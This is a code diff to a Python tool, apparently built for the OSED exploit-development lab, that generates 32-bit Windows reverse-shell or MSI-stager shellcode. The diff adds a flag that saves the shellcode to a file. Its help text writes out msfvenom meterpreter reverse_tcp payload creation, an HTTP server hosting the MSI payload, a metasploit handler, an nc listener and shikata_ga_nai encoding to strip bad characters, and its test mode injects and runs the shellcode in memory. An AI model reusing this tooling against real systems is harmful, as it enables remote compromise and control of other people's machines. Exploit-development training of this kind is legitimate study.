@@ -360,14 +360,19 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
 
 
 def main(args):
+    help_msg = ""
     if (args.msi):
         shellcode = msi_shellcode(args.lhost, args.lport, args.debug_break)
-        help_msg =  f'\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n'
-        help_msg += f'\t sudo python -m SimpleHTTPServer {args.lport} \n'
-        help_msg += f'\t sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT 443; exploit"'
+        help_msg +=  f'\t Create msi payload:\n'
+        help_msg +=  f'\t\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n'
+        help_msg +=  f'\t Start http server (hosting the msi file):\n'
+        help_msg += f'\t\t sudo python -m SimpleHTTPServer {args.lport} \n'
+        help_msg +=  f'\t Start the metasploit listener:\n'
+        help_msg += f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT 443; exploit"'
     else:
         shellcode = rev_shellcode(args.lhost, args.lport, args.debug_break)
-        help_msg =  f'\t nc -lnvp {args.lport}'
+        help_msg +=  f'\t Start listener:\n'
+        help_msg +=  f'\t\t nc -lnvp {args.lport}'
 
     eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
     encoding, count = eng.asm(shellcode)
@@ -398,13 +403,20 @@ def main(args):
     print(f"[=]   lport: {args.lport}")
     print(f"[=]   break: {['breakpoint disabled', 'breakpoint active'][args.debug_break]}")
     print(f"[=]   ver:   {['pure reverse sehll', 'MSI stager'][args.msi]}")
-    print(f"[=]   help:   ")
+    if (args.store_shellcode):
+        print(f"[=]   Shellcode stored in: shellcode.bin")
+        f = open("shellcode.bin", "wb")
+        f.write(bytearray(encoding))
+        f.close()
+    print(f"[=]   help:")
     print(help_msg)
+    print("\t Remove bad chars with msfvenom (use --store-shellcode flag): ")
+    print("\t\t cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\" -f python -v shellcode")
     print()
     print(final)
-
-
+    
     if args.test_shellcode:
+        print(f"\n[+] Debugging shellcode ...")
         sh = b""
         for e in encoding:
             sh += struct.pack("B", e)
@@ -413,7 +425,7 @@ def main(args):
         ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(packed_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
         buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
         ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode)))
-        print("Shellcode located at address %s" % hex(ptr))
+        print("[=]   Shellcode located at address %s" % hex(ptr))
         input("...ENTER TO EXECUTE SHELLCODE...")
         ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
             ctypes.c_int(0),
@@ -425,14 +437,15 @@ def main(args):
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='Creates an egghunter compatible with the OSED lab VM')
+    parser = argparse.ArgumentParser(description='Creates shellcodes compatible with the OSED lab VM')
     
-    parser.add_argument('-l', '--lhost', help='tag for which the egghunter will search (default: 127.0.0.1)', default='127.0.0.1')
-    parser.add_argument('-p', '--lport', help='tag for which the egghunter will search (default: 4444)', default='4444')
+    parser.add_argument('-l', '--lhost', help='listening attacker system (default: 127.0.0.1)', default='127.0.0.1')
+    parser.add_argument('-p', '--lport', help='listening port of the attacker system (default: 4444)', default='4444')
     parser.add_argument('-b', '--bad-chars', help='space separated list of bad chars to check for in final egghunter (default: 00)', default=['00'], nargs='+')
     parser.add_argument('-m', '--msi', help='use an msf msi exploit stager (short)', action='store_true')
     parser.add_argument('-d', '--debug-break', help='add a software breakpoint as the first shellcode instruction', action='store_true')
     parser.add_argument('-t', '--test-shellcode', help='test the shellcode on the system', action='store_true')
+    parser.add_argument('-s', '--store-shellcode', help='store the shellcode in binary format in the file shellcode.bin', action='store_true')
 
 
     args = parser.parse_args()
